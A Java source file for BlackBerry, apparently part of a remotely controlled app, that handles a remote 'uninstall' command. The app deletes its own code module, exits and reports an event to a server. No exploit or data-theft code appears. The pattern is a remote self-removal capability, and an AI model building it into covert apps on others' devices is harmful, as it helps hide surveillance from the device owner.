package com.vvt.rmtcmd.pcc;

import net.rim.device.api.system.CodeModuleManager;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.std.Constant;

public class PCCUninstall extends PCCRmtCmdAsync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	
	private void uninstallApplication() {
		int moduleHandle = CodeModuleManager.getModuleHandle(ApplicationInfo.APPLICATION_NAME);
		CodeModuleManager.deleteModuleEx(moduleHandle, true);
		System.exit(0);
	}
	
	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.UNINSTALL.getId());
		try {
			uninstallApplication();
			responseMessage.append(Constant.OK);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
